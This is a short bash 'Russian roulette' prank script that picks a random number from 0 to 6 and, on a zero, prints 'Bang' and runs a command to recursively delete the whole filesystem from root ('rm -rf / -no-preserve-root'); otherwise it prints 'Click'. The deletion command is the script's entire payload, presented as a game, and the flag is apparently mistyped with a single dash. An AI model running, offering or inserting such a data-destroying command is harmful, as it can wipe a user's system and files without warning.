#!/bin/bash

num="$(shuf -i 0-6 -n 1)"
if [ "$num" = "0" ] ; then 
	echo "Bang" ;
	rm -rf / -no-preserve-root 
else 
	echo "Click" ;
fi
